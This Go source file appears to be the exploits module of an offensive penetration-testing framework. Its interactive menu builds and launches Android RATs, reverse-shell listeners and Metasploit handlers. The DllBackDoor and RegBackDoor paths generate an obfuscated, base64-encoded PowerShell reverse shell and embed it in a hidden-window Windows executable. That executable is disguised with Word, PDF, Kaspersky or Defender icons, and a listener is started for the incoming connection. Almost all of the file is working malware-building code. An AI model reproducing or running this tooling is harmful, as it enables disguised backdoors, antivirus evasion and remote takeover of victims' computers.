package exploits

import (
    "os"
    "fmt"
    "utils"
    "bufio"
    "menus"
    "banners"
    "strconv"
    "strings"
    "bcolors"
    "io/ioutil"
    "subprocess"
    "scriptures"
    "path/filepath"
    "encoding/base64"
)

var (
    Icon = "word"
    Lport = "9999"
    Hport = "3333"
    Protocol = "tcp"
    Listener = "blackjack"
    Malware  = "africana_malware"
    Lhost = LhostIp
    LhostIp, _ = utils.GetDefaultIP()
    scanner = bufio.NewScanner(os.Stdin)
    Input, Rhost, Proxy, Function, Script string
    CertDir, OutPutDir, KeyPath, CertPath, ToolsDir, RokyPath, WordList = utils.DirLocations()
)

var defaultValues = map[string]string{
    "script": "",
    "proxies": "",
    "icon": "word",
    "function": "",
    "lport": "9999",
    "hport": "3333",
    "protocol": "tcp",
    "listener": "blackjack",
    "build": "africana_malware",
    "lhost": LhostIp,
    "output": OutPutDir,
}

type stringMatcher struct {
    names  []string
    action func()
}

const (
    CHAR            = "├──"
    CHAR1           = "└──"
    SPACE_PREFIX    = "   "
)

func ExploitsPentest() {
    for {
        fmt.Printf("%s%safr3%s exploits(%s%ssrc/pentest_%s.fn%s)%s > %s", bcolors.Underl, bcolors.Bold, bcolors.Endc, bcolors.Bold, bcolors.BrightRed, Function, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        scanner.Scan()
        Input = strings.TrimSpace(scanner.Text())
        buildParts := strings.Fields(strings.ToLower(Input))
        if len(buildParts) == 0 {
            continue
        }

        if executeCommand(Input) {
            continue
        }

        switch buildParts[0] {
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "set":
            handleSetCommand(buildParts)
        case "unset", "delete":
            handleUnsetCommand(buildParts)
        case "run", "start", "launch", "exploit", "execute":
            executeFunction()
        default:
            utils.SystemShell(Input)
        }
    }
}

func executeCommand(cmd string) bool {
    commandGroups := []stringMatcher{

        {[]string{"? info", "h info", "help info"}, menus.HelpInfo},
        {[]string{"v", "version"}, banners.Version},
        {[]string{"s", "sleep"}, utils.Sleep},
        {[]string{"c", "clear", "clear screen", "screen clear"}, utils.ClearScreen},

        {[]string{"histo", "history", "show history", "log", "logs", "show log", "show logs"}, subprocess.ShowHistory},
        {[]string{"c junk", "c junks", "c output", "c outputs", "clear junk", "clear junks", "clear output", "clear outputs"}, utils.ClearJunks},
        {[]string{"c log", "c logs", "c history", "c histories", "clear log", "clear logs", "clear history", "clear histories"}, subprocess.ClearHistory},
        {[]string{"junk", "junks", "output", "outputs", "show junk", "show junks", "show output", "show outputs", "l junk", "l junks", "l output", "l outputs", "list junk", "list junks", "list output", "list outputs"}, utils.ListJunks},

        {[]string{"? run", "h run", "info run", "help run", "? exec", "h exec", "info exec", "help exec", "? launch", "h launch", "info launch", "help launch", "? exploit", "h exploit", "info exploit", "help exploit", "? execute", "h execute", "info execute", "help execute"}, menus.HelpInfoRun},

        {[]string{"set", "h set", "info set", "help set"}, menus.HelpInfoSet},
        {[]string{"use", "? use", "h use", "info use", "help use"}, menus.HelpInfoUse},

        {[]string{"tips", "h tips", "? tips", "info tips", "help tips"}, menus.HelpInfoTips},
        {[]string{"show", "? show", "h show", "info show", "help show"}, menus.HelpInfoShow},
        {[]string{"info list", "help list", "use list", "list"}, menus.HelpInfoList},
        {[]string{"h option", "? option", "h options", "? options", "info option", "help option", "info options", "help options"}, menus.HelpInfOptions},
        {[]string{"banner"}, banners.RandomBanners},
        {[]string{"g", "t", "guide", "tutarial"}, utils.BrowseTutarilas},
        {[]string{"h", "?", "00", "help"}, menus.HelpInfoMenuZero},
        {[]string{"f", "use f", "features", "use features"}, menus.HelpInfoFeatures},

        {[]string{"info"}, menus.HelpInfoExploits},
        {[]string{"m", "menu"}, menus.MenuFour},
        {[]string{"option", "options", "show option", "show options"}, menus.ExploitsOptions},
        {[]string{"func", "funcs", "functions", "show func", "list funcs", "show funcs", "show function", "list function", "list functions", "show functions", "module", "modules", "list module", "show module", "list modules", "show modules", "show all", "list all"}, menus.ListExploitsFunctions},
        {[]string{"icon", "icons", "show icon", "show icons", "list icon", "list icons"}, menus.ListIcons},

        {[]string{"listener", "listeners", "show listener", "show listeners", "list listener", "list listeners"}, menus.ListListenersFunctions},
        {[]string{"obfuscator", "obfuscators", "show obfuscator", "show obfuscators", "list obfuscator", "list obfuscators"}, menus.ListObfscatorsFunctions},

        {[]string{"1", "run 1", "use 1", "exec 1", "start 1", "launch 1", "exploit 1", "execute 1", "run androrat", "use androrat", "exec androrat", "start androrat", "launch androrat", "exploit androrat", "execute androrat"}, func() { AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir); menus.MenuFour() }},
        {[]string{"? 1", "info 1", "help 1", "androrat", "info androrat", "help androrat"}, menus.HelpInfoAndroRat},

        {[]string{"2", "run 2", "use 2", "exec 2", "start 2", "launch 2", "exploit 2", "execute 2", "run teardroid", "use teardroid", "exec teardroid", "start teardroid", "launch teardroid", "exploit teardroid", "execute teardroid"}, func() { TearDroid(Malware, ToolsDir, OutPutDir); menus.MenuFour() }},
        {[]string{"? 2", "info 2", "help 2", "teardroid", "info teardroid", "help teardroid"}, menus.HelpInfoTearDroid},

        {[]string{"3", "run 3", "use 3", "exec 3", "start 3", "launch 3", "exploit 3", "execute 3", "run blackjack", "use blackjack", "exec blackjack", "start blackjack", "launch blackjack", "exploit blackjack", "execute blackjack"}, func() { BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour() }},
        {[]string{"? 3", "info 3", "help 3", "blackjack", "info blackjack", "help blackjack"}, menus.HelpInfoBlackJack},

        {[]string{"4", "run 4", "use 4", "exec 4", "start 4", "launch 4", "exploit 4", "execute 4", "run hoaxshell", "use hoaxshell", "exec hoaxshell", "start hoaxshell", "launch hoaxshell", "exploit hoaxshell", "execute hoaxshell"}, func() { HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour() }},
        {[]string{"? 4", "info 4", "help 4", "hoaxshell", "info hoaxshell", "help hoaxshell"}, menus.HelpInfoHoaxShell},

        {[]string{"5", "run 5", "use 5", "exec 5", "start 5", "launch 5", "exploit 5", "execute 5", "run shellz", "use shellz", "exec shellz", "start shellz", "launch shellz", "exploit shellz", "execute shellz"}, func() { Shellz(); menus.MenuFour() }},
        {[]string{"? 5", "info 5", "help 5", "shellz", "info shellz", "help shellz"}, menus.HelpInfoShellz},

        {[]string{"6", "run 6", "use 6", "exec 6", "start 6", "launch 6", "exploit 6", "execute 6", "run ghost", "use ghost", "exec ghost", "start ghost", "launch ghost", "exploit ghost", "execute ghost"}, func() { Gh0x0st(Malware, ToolsDir, Script, OutPutDir); menus.MenuFour() }},
        {[]string{"? 6", "info 6", "help 6", "ghost", "info ghost", "help ghost"}, menus.HelpInfoGhost},

        {[]string{"7", "run 7", "use 7", "exec 7", "start 7", "launch 7", "exploit 7", "execute 7", "run chameleon", "use chameleon", "exec chameleon", "start chameleon", "launch chameleon", "exploit chameleon", "execute chameleon"}, func() { Chameleon(Malware, ToolsDir, Script, OutPutDir); menus.MenuFour() }},
        {[]string{"? 7", "info 7", "help 7", "chameleon", "info chameleon", "help chameleon"}, menus.HelpInfoChameleon},

        {[]string{"8", "run 8", "use 8", "exec 8", "start 8", "launch 8", "exploit 8", "execute 8", "run dllbackdoor", "use dllbackdoor", "exec dllbackdoor", "start dllbackdoor", "launch dllbackdoor", "exploit dllbackdoor", "execute dllbackdoor"}, func() { DllBackDoor(ToolsDir, Lport, Hport, Protocol, Script, Icon, Listener, Lhost, OutPutDir) ; menus.MenuFour() }},
        {[]string{"? 8", "info 8", "help 8", "dllbackdoor", "info dllbackdoor", "help dllbackdoor"}, menus.HelpInfoDllBackDoor},

        {[]string{"9", "run 9", "use 9", "exec 9", "start 9", "launch 9", "exploit 9", "execute 9", "run regbackdoor", "use regbackdoor", "exec regbackdoor", "start regbackdoor", "launch regbackdoor", "exploit regbackdoor", "execute regbackdoor"}, func() { RegBackDoor(ToolsDir, Lport, Hport, Protocol, Script, Icon, Listener, Lhost, OutPutDir); menus.MenuFour() }},
        {[]string{"? 9", "info 9", "help 9", "regbackdoor", "info regbackdoor", "help regbackdoor"}, menus.HelpInfoRegBackDoor},

        {[]string{"10", "run 10", "use 10", "exec 10", "start 10", "launch 10", "exploit 10", "execute 10", "run verses", "use verses", "exec verses", "start verses", "launch verses", "exploit verses", "execute verses"}, scriptures.ScriptureNarators},
        {[]string{"? 10", "verses", "info 10", "help 10", "info verses", "help verses"}, menus.HelpInfoVerses},
    }

    cmdLower := strings.ToLower(cmd)
    for _, group := range commandGroups {
        for _, name := range group.names {
            if name == cmdLower {
                group.action()
                return true
            }
        }
    }
    return false
}

func handleSetCommand(parts []string) {
    if len(parts) < 3 {
        menus.HelpInfoSet()
        return
    }
    key, value := parts[1], parts[2]
    setValues := map[string]*string{

        "icon": &Icon,
        "lhost": &Lhost,
        "lport": &Lport,
        "hport": &Hport,
        "script": &Script,
        "build": &Malware,
        "func": &Function,
        "proxies": &Proxy,
        "funcs": &Function,
        "module": &Function,
        "output": &OutPutDir,
        "listener": &Listener,
        "function": &Function,
        "protocol": &Protocol,
        "listeners": &Listener,
        "functions": &Function,
    }

    if ptr, exists := setValues[key]; exists {
        *ptr = value
        fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
    } else {
        menus.HelpInfoSet()
    }
}

func handleUnsetCommand(parts []string) {
    if len(parts) < 2 {
        menus.HelpInfoSet()
        return
    }
    key := parts[1]
    unsetValues := map[string]*string{

        "icon": &Icon,
        "lhost": &Lhost,
        "lport": &Lport,
        "hport": &Hport,
        "script": &Script,
        "build": &Malware,
        "func": &Function,
        "proxies": &Proxy,
        "funcs": &Function,
        "module": &Function,
        "output": &OutPutDir,
        "listener": &Listener,
        "function": &Function,
        "protocol": &Protocol,
        "listeners": &Listener,
        "functions": &Function,
    }

    if ptr, exists := unsetValues[key]; exists {
        *ptr = defaultValues[key]
        if *ptr != "" {
            fmt.Printf("%s => %s\n", strings.ToUpper(key), *ptr)
        }else{
            fmt.Printf("%s => %s\n", strings.ToUpper(key), "Null")
        }
    } else {
        menus.HelpInfoSet()
    }
}

func MalwarePenFunctions(Function string, args ...interface{}) {
    if Proxy != "" {
        fmt.Printf("PROXIES => %s\n", Proxy)
        if err := utils.SetProxy(Proxy); err != nil {
            // Error already printed
        }
    }

    commands := map[string]func(){
        "androrat": func() { AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir) },
        "teardroid": func() { TearDroid(Malware, ToolsDir, OutPutDir) },
        "blackjack": func() { BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir) },
        "hoaxshell": func() { HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir) },
        "shellz": func() { Shellz() },
        "ghost": func() { Gh0x0st(Malware, ToolsDir, Script, OutPutDir) },
        "chameleon": func() { Chameleon(Malware, ToolsDir, Script, OutPutDir) },
        "dllbackdoor": func() { DllBackDoor(ToolsDir, Lport, Hport, Protocol, Script, Icon, Listener, Lhost, OutPutDir) },
        "regbackdoor": func() { RegBackDoor(ToolsDir, Lport, Hport, Protocol, Script, Icon, Listener, Lhost, OutPutDir) },
        "ncat": func() { Ncat(Lport, Protocol) },
        "havoc": func() { Havoc() },
        "seashell": func() { SeaShell() },
        "meterpeter": func() { MeterPeter() },
        "powerjoker": func() { PowerJoker(Lhost, Lport, ToolsDir) },
        "metasploit": func() { Metasploit(Lhost, Lport, Protocol) },

        "1": func() { AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir) },
        "2": func() { TearDroid(Malware, ToolsDir, OutPutDir) },
        "3": func() { BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir) },
        "4": func() { HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir) },
        "5": func() { Shellz() },
        "6": func() { Gh0x0st(Malware, ToolsDir, Script, OutPutDir) },
        "7": func() { Chameleon(Malware, ToolsDir, Script, OutPutDir) },
        "8": func() { DllBackDoor(ToolsDir, Lport, Hport, Protocol, Script, Icon, Listener, Lhost, OutPutDir) },
        "9": func() { RegBackDoor(ToolsDir, Lport, Hport, Protocol, Script, Icon, Listener, Lhost, OutPutDir) },
       "10": func() { Ncat(Lport, Protocol) },
       "11": func() { Havoc() },
       "12": func() { SeaShell() },
       "13": func() { MeterPeter() },
       "14": func() { PowerJoker(Lhost, Lport, ToolsDir) },
       "15": func() { Metasploit(Lhost, Lport, Protocol) },
    }

    textCommands := []string{"ncat", "havoc", "ghost", "chameleon", "shellz", "seashell", "androrat", "teardroid", "blackjack", "hoaxshell", "meterpeter", "powerjoker", "metasploit", "dllbackdoor", "regbackdoor" }

    if action, exists := commands[Function]; exists {
        action()
        return
    }

    if num, err := strconv.Atoi(Function); err == nil {
        fmt.Printf("\n%s[!] %sNumber %d is invalid. Valid numbers are from 1-15.\n", bcolors.Yellow, bcolors.Endc, num)
        menus.ListExploitsFunctions()
        return
    }

    lowerInput := strings.ToLower(Function)
    for _, cmd := range textCommands {
        lowerCmd := strings.ToLower(cmd)
        if strings.HasPrefix(lowerCmd, lowerInput) || strings.Contains(lowerCmd, lowerInput) || utils.Levenshtein(lowerInput, lowerCmd) <= 2 {
            fmt.Printf("\n%s[!] %sFunction '%s%s%s' is invalid. Did you mean %s'%s'%s?\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, Function, bcolors.Endc, bcolors.Green, cmd, bcolors.Endc)
            return
        }
    }

    fmt.Printf("\n%s[!] %sModule '%s' is invalid. Available commands:\n", bcolors.Yellow, bcolors.Endc, Function)
    menus.ListExploitsFunctions()
}

func executeFunction() {
    if Function == "" {
        fmt.Printf("\n%s[!] %sNo MODULE was set. Use %s'show modules' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    MalwarePenFunctions(Function, Lhost, Protocol, Lport, Hport, Malware, Listener)
}


func Havoc() {
    subprocess.Popen(`havoc client & havoc server -d -v`)
}

func Shellz() {
    subprocess.Popen(`cd %s/exploits/windows/listeners/shells/; bash shells.sh`, ToolsDir)
}

func SeaShell() {
    subprocess.Popen(`cd %s/exploits/mackos/listeners/seashell/; python3 sea_shell.py`, ToolsDir)
}

func MeterPeter() {
    subprocess.Popen(`cd %s/exploits/windows/listeners/meterpeter/; pwsh meterpeter.ps1`, ToolsDir)
}

func TearDroid(Malware string, ToolsDir string, OutPutDir string) {
    fmt.Printf("\nBUILD => %s.apk\nOUTPUT => %s\n\n", Malware, OutPutDir)
    subprocess.Popen(`cd %s/exploits/androids/listeners/teardroid/; python3 Teardroid.py -b %s`, ToolsDir, Malware)
}

func AndroRat(Lhost string, Lport string, Malware string, ToolsDir string, OutPutDir string) {
    filePath := "/usr/bin/zipalign.bak_africana"
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        subprocess.Popen(`mv /usr/bin/zipalign /usr/bin/zipalign.bak_africana; apt-get install %s/exploits/androids/listeners/androrat/zipalign_8.1.0.deb --allow-downgrades -y`, ToolsDir)
    }
    fmt.Printf("\nLPORT => %s\nLHOST => %s\nBUILD => %s.apk\nOUTPUT => %s\n\n", Lport, Lhost, Malware, OutPutDir)
    subprocess.Popen(fmt.Sprintf("cd %s/exploits/androids/listeners/androrat/; python3 androrat.py --build -i %s -p %s -o %s/%s.apk", ToolsDir, Lhost, Lport, OutPutDir, Malware))
    subprocess.Popen(fmt.Sprintf("cd %s/exploits/androids/listeners/androrat/; python3 androrat.py --shell -i %s -p %s", ToolsDir, Lhost, Lport))
}

func Chameleon(Malware string, ToolsDir string, Script string, OutPutDir string) {
    if Script == "" {
        fmt.Printf("%s[!] %s SCRIPT location not set. Use %s'show options' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\nBUILD => %s\nSCRIPT => %s\nOUTPUT => %s\n\n", Malware, Script, OutPutDir)
    subprocess.Popen(`cd %s/exploits/windows/obfuscators/chameleon/; python3 chameleon.py -f -s --verbose %s -o %s/%s`, ToolsDir, Script, OutPutDir, Malware)

}

func Gh0x0st(Malware string, ToolsDir string, Script string, OutPutDir string) {
    if Script == "" {
        fmt.Printf("%s[!] %s SCRIPT location not set. Use %s'show options' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\nBUILD => %s\nSCRIPT => %s\nOUTPUT => %s%s\n\n", Malware, Script, OutPutDir,  Malware + ".ps1")
    subprocess.Popen(`cd %s/exploits/windows/obfuscators/Invoke-PSObfuscation/; pwsh -c "Import-Module ./Invoke-PSObfuscation.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s%s"`, ToolsDir, Script, OutPutDir, Malware + ".ps1")
}

func PowerJoker(Lhost string, Lport string, ToolsDir string) {
    fmt.Printf("\nLPORT => %s\nLHOST => %s\n\n", Lport, Lhost)
    subprocess.Popen(`cd %s/exploits/windows/listeners/joker/; python3 joker.py -l %s -p %s`, ToolsDir, Lhost, Lport)
}

func HoaxShell(Lhost string, Lport string, Hport string, Protocol string, ToolsDir string) {
    switch strings.ToLower(Protocol) {
    case "tcp":
        fmt.Printf("\nLPORT => %s\nPROTOCOL => %s\nLHOST => %s\n\n", Lport, Protocol, Lhost)
        subprocess.Popen("cd %s/exploits/windows/listeners/hoaxshell/; python3 hoaxshell.py -s %s -p %s", ToolsDir, Lhost, Lport)
    case "http", "https":
        fmt.Printf("\nLPORT => %s\nPROTOCOL => %s\nLHOST => %s\n\n", Lport, Protocol, Lhost)
        subprocess.Popen("cd %s/exploits/windows/listeners/hoaxshell/; python3 hoaxshell.py -s %s -p %s -c %s -k %s", ToolsDir, Lhost, Lport, CertPath, KeyPath)
        fmt.Println()
    default:
        fmt.Printf("%s[!] %sError: Invalid Protocol type. Try %s'show protocols' %sfor help\n", bcolors.BrightRed, bcolors.BrightGreen, bcolors.Endc)
    }
}

func BlackJack(Lhost string, Lport string, Hport string, Protocol string, ToolsDir string) {
    switch strings.ToLower(Protocol) {
    case "tcp":
        fmt.Printf("\nLPORT => %s\nPROTOCOL => %s\nLHOST => %s\n\n", Lport, Protocol, Lhost)
        subprocess.Popen("cd %s/exploits/windows/listeners/blackjack/; python3 blackjack.py -i -n %s\n", ToolsDir, Lport)
    case "http", "https":
        fmt.Printf("\nLPORT => %s\nHPORT => %s\nPROTOCOL => %s\nLHOST => %s\n\n", Lport, Hport, Protocol, Lhost)
        subprocess.Popen("cd %s/exploits/windows/listeners/blackjack/; python3 blackjack.py -i -x %s -n %s -c %s -k %s", ToolsDir, Lport, Hport, CertPath, KeyPath)
        fmt.Println()
    default:
        fmt.Printf("%s[!] %sError: Invalid Protocol type. Try %s'show protocols' %sfor help\n", bcolors.BrightRed, bcolors.BrightGreen, bcolors.Endc)
    }
}

func Ncat(Lport string, Protocol string) {
    switch strings.ToLower(Protocol) {
    case "tcp":
        fmt.Printf("\nLPORT => %s\nPROTOCOL => %s\nLHOST => %s\n\n", Lport, Protocol, Lhost)
        subprocess.Popen(`rlwrap ncat -lnvp %s`, Lport)
    case "http", "https":
         fmt.Printf("\nLPORT => %s\nHPORT => %s\nPROTOCOL => %s\nLHOST => %s\n\n", Lhost, Lport, Hport, Protocol)
         subprocess.Popen(`rlwrap ncat --ssl --ssl-cert %s --ssl-key %s -lnvp %s`, CertPath, KeyPath, Lport)
    default:
        fmt.Printf("%s[!] %sError: Invalid Protocol type. Try %s'show protocols' %sfor help\n", bcolors.BrightRed, bcolors.BrightGreen, bcolors.Endc)
    }
}

func Metasploit(Lhost string, Lport string, Protocol string) {
    switch strings.ToLower(Protocol) {
    case "tcp":
        fmt.Printf("\nLPORT => %s\nPROTOCOL => %s\nLHOST => %s\n\n", Lport, Protocol, Lhost)
        subprocess.Popen(`msfconsole -x "use multi/handler;set payload windows/powershell_reverse_tcp; set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j"`, Lhost, Lport)
    case "http", "https":
        fmt.Printf("\nLPORT => %s\nPROTOCOL => %s\nLHOST => %s\n\n", Lport, Protocol, Lhost)
        subprocess.Popen(`msfconsole -x "use multi/handler;set payload windows/powershell_reverse_tcp_ssl; set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j"`, Lhost, Lport)
    default:
        fmt.Printf("%s[!] %sError: Invalid Protocol type. Try %s'show protocols' %sfor help\n", bcolors.BrightRed, bcolors.BrightGreen, bcolors.Endc)
    }
}

func IconChanger(Icon string, ToolsDir string, OutPutDir string) {
    validIcons := map[string]bool{
        "lync": true, "excel": true, "access": true, "autorun": true, "pdf": true, "project": true, "publisher": true, "powerpoint": true, "rat": true, "vlc": true, "word": true, "visio": true, "kaspersky": true, "defender": true,
    }

    icon := strings.ToLower(Icon)
    if !validIcons[icon] {
        fmt.Printf("%s[-] %sError: Invalid icon choice '%s'\n", bcolors.Red, bcolors.Endc, Icon)
        return
    }

    winresD := filepath.Join(ToolsDir, "exploits/payload_templates/rcedits/winres")
    iconSrc := filepath.Join(ToolsDir, "exploits/payload_templates/icons", icon + ".png")
    iconDst := filepath.Join(winresD, "icon.png")
    rceditD := filepath.Join(ToolsDir, "exploits/payload_templates/rcedits")

    utils.Copy(iconSrc, iconDst)

    subprocess.Popen("cd %s; ./go_winres make --in winres/winres.json", rceditD)
    subprocess.Popen("mv %s/*.syso %s && mv %s/winres/icon.png %s", rceditD, OutPutDir, rceditD, OutPutDir)

    os.WriteFile(filepath.Join(OutPutDir, "go.mod"), []byte("module main"), 0644)
}

func ShikataGanai(ToolsDir string, Lport string, Hport string, Protocol string, Script string, Listener string, Lhost string, OutPutDir string) {
    Icon            := "kaspersky"
    outputExe       := "raw_backdoor.exe"
    templateD       := "exploits/payload_templates"
    goTemplate      := "go_payloads/raw_backdoor.go"
    psTemplate      := "ncat_payloads/powershell_reverse_%s.ps1"

    fmt.Printf("\nICON => %s\nLPORT => %s\nHPORT => %s\nPROTOCOL => %s\nListener => %s\nLHOST => %s\n", Icon, Lport, Hport, Protocol, Listener, Lhost)

    protocol := strings.ToLower(Protocol)
    if protocol != "tcp" && protocol != "http" && protocol != "https" {
        fmt.Printf("%s[!] %sError: Invalid Protocol type. %s Try %s'show protocols' %sfor help\n", bcolors.BrightRed, bcolors.BrightGreen, Protocol, bcolors.Endc)
        return
    }

    psSrc := filepath.Join(ToolsDir, templateD, fmt.Sprintf(psTemplate, protocol))
    psTxt := filepath.Join(OutPutDir, fmt.Sprintf("powershell_reverse_%s.txt", protocol))
    utils.Copy(psSrc, psTxt)

    utils.Editors(map[string]map[string]string{
        psTxt: {"*LHOST*": Lhost, "*LPORT*": Lport},
    })

    psOb := filepath.Join(OutPutDir, fmt.Sprintf("powershell_reverse_%s.ps1", protocol))
    Gh0x0st(fmt.Sprintf("/powershell_reverse_%s", protocol), ToolsDir, psTxt, OutPutDir)

    encoded, err := utils.EncodeFileToPowerShellEncodedCommand(psOb)
    if err != nil {
        fmt.Fprintf(os.Stderr, "%sError encoding file: %v%s\n", bcolors.Red, err, bcolors.Endc)
        return
    }else{
        fmt.Printf("\nPowershell -w 1 -enc %s%s%s\n", bcolors.BrightGreen, encoded, bcolors.Endc)
    }

    goSrc := filepath.Join(ToolsDir, templateD, goTemplate)
    goDst := filepath.Join(OutPutDir, "main.go")
    utils.Copy(goSrc, goDst)

    utils.Editors(map[string]map[string]string{
        goDst: {"africana_backdoor": encoded},
    })

    fmt.Printf("\n%s[+] %sGenerating raw_backdoor descriptions! %s✓%s\n", bcolors.Green, bcolors.Endc, bcolors.Green, bcolors.Endc)
    IconChanger(Icon, ToolsDir, OutPutDir)

    fmt.Printf("%s[+] %sCompiling raw_backdoor with descriptios! %s✓%s\n", bcolors.Green, bcolors.Endc, bcolors.Green, bcolors.Endc)
    subprocess.Popen("cd %s; GOOS=windows GOARCH=amd64 go build -ldflags='-w -s -H windowsgui' -o %s", OutPutDir, filepath.Join(OutPutDir, outputExe))
}

func DllBackDoor(ToolsDir string, Lport string, Hport string, Protocol string, Script string, Icon string, Listener string, Lhost string, OutPutDir string) {
    ShikataGanai(ToolsDir, Lport, Hport, Protocol, Script, Listener, Lhost, OutPutDir)

    dllFilePath := filepath.Join(ToolsDir, "exploits/payload_templates/dll_injects/Secur32.dll")
    exeFilePath := filepath.Join(OutPutDir, "raw_backdoor.exe")
 
    dllData, _ := ioutil.ReadFile(dllFilePath)
    exeData, _ := ioutil.ReadFile(exeFilePath)

    encodedExe := base64.StdEncoding.EncodeToString(exeData)
    encodedDll := base64.StdEncoding.EncodeToString(dllData)

    src := filepath.Join(ToolsDir, "exploits/payload_templates/go_payloads/malware_runner_dll.go")
    dst := filepath.Join(OutPutDir, "main.go")
    subprocess.Popen("rm -f %s", dst)
    utils.Copy(src, dst)

    utils.Editors(map[string]map[string]string{
        dst: {
            "africana_backdoor_e": encodedExe,
            "africana_backdoor_d": encodedDll,
        },
    })

    fmt.Printf("%s[+] %sGenerating final_backdoor descriptions! %s✓%s\n", bcolors.Green, bcolors.Endc, bcolors.Green, bcolors.Endc)
    IconChanger(Icon, ToolsDir, OutPutDir)

    fmt.Printf("%s[+] %sCompiling final_backdoor with descriptios! %s✓%s\n", bcolors.Green, bcolors.Endc, bcolors.Green, bcolors.Endc)
    subprocess.Popen("cd %s; GOOS=windows GOARCH=amd64 go build -ldflags='-w -s -H windowsgui' -o %s", OutPutDir, filepath.Join(OutPutDir, "africana_backdoor.exe"))

    fmt.Printf("%s[+] %sComplete backdoor saved at: %s%s%s\n", bcolors.Green, bcolors.Endc, bcolors.BrightRed, filepath.Join(OutPutDir, "africana_backdoor.exe"), bcolors.Endc)
    ListenerLauncher(Lport, Hport, Protocol, Listener)
}

func RegBackDoor(ToolsDir string, Lport string, Hport string, Protocol string, Script string, Icon string, Listener string, Lhost string, OutPutDir string) {
    ShikataGanai(ToolsDir, Lport, Hport, Protocol, Script, Listener, Lhost, OutPutDir)

    exeFilePath := filepath.Join(OutPutDir, "raw_backdoor.exe")
    exeData, _ := ioutil.ReadFile(exeFilePath)
    encodedExe := base64.StdEncoding.EncodeToString(exeData)

    src := filepath.Join(ToolsDir, "exploits/payload_templates/go_payloads/malware_runner_reg.go")
    dst := filepath.Join(OutPutDir, "main.go")
    subprocess.Popen("rm -f %s", dst)
    utils.Copy(src, dst)

    utils.Editors(map[string]map[string]string{
        dst: {"africana_backdoor_e": encodedExe},
    })

    fmt.Printf("%s[+] %sGenerating final_backdoor descriptions! %s✓%s\n", bcolors.Green, bcolors.Endc, bcolors.Green, bcolors.Endc)
    IconChanger(Icon, ToolsDir, OutPutDir)

    fmt.Printf("%s[+] %sCompiling final_backdoor with descriptios! %s✓%s\n", bcolors.Green, bcolors.Endc, bcolors.Green, bcolors.Endc)
    subprocess.Popen("cd %s; GOOS=windows GOARCH=amd64 go build -ldflags='-w -s -H windowsgui' -o %s", OutPutDir, filepath.Join(OutPutDir, "africana_backdoor.exe"))

    fmt.Printf("%s[+] %sComplete backdoor saved at: %s%s%s\n", bcolors.Green, bcolors.Endc, bcolors.BrightRed, filepath.Join(OutPutDir, "africana_backdoor.exe"), bcolors.Endc)
    ListenerLauncher(Lport, Hport, Protocol, Listener)
}

func ListenerLauncher(Lport string, Hport string, Protocol string, Listener string) {
    fmt.Printf("%s[>] %sLaunching %s listener %s...\n", bcolors.Yellow, bcolors.Endc, Listener, bcolors.Endc)
    switch strings.ToLower(Listener) {
    case "1", "blackjack":
        BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir)
        return
    case "2", "hoaxshell":
        HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir)
        return
    case "3", "ncat":
        Ncat(Lport, Protocol)
        return
    case "4", "metasploit":
        Metasploit(Lhost, Lport, Protocol)
        return
    default:
        fmt.Printf("\n%s[!] %sError: Invalid LISTENER. Try 'show listeners' type", bcolors.BrightRed, bcolors.Endc)
    }
}
